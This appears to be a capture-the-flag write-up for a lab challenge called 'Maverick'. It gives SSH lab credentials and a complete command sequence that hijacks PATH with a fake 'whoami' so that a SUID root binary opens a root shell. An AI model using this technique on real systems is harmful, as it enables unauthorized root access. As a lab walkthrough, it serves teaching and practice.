# Name: Web: Privilege Escalation: Maverick

## Vulnerability

PATH Variable privilege escalation.

PATH is an environmental variable in Linux operating systems which specifies directories that hold all executable programs are stored.

The logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege: due to lack of attention while writing program, the writer **does not specify the full path to the program**.

```echo $PATH```

## Exploit

Connect with ssh to user ```maverick:jXztBtEWKYRMrjAF```, port 2022.

```ssh maverick@<IP> -p 2022```

Inside the ```/home/maverick/scripts``` directory, we will see a binary called ```favorite-quote```, having the SUID  permissions:

```ls -la favorite-quote```

```-rwsr-xr-x 1 root     root      17K Jul 26 12:56 favorite-quote```

If we move inside that directory and run the ```strings favorite-quote``` command, we can see that somehow a ```whoami``` command is executed. Maybe the developer forgot to specify the full path of the binary.

We will try to recreate a new binary file called ```whoami``` which contains ```/bin/bash```.

```bash
cd /tmp
echo "/bin/bash" > whoami
chmod 777 whoami
echo $PATH
export PATH=/tmp:$PATH
cd /home/maverick/scripts
./favorite-quote
whoami
```

And now you are root!
